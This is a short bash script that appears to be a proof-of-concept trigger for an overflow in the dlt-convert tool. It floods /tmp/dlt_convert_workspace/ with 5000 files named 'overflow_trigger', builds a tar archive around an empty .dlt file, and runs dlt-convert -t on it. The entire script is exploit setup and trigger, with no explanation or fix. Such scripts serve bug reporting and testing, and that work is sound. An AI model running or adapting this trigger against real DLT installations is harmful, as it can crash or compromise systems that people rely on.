#!/bin/bash

TARGET_DIR="/tmp/dlt_convert_workspace/"

rm -rf "$TARGET_DIR"
rm -f trigger.tar harmless.dlt

mkdir -p "$TARGET_DIR"


echo "[*] Flooding directory with 5000 files..."
for i in {1..5000}; do
    touch "${TARGET_DIR}/overflow_trigger_$i"
done

touch harmless.dlt
tar -cvf trigger.tar harmless.dlt > /dev/null 2>&1


./src/console/dlt-convert -t trigger.tar

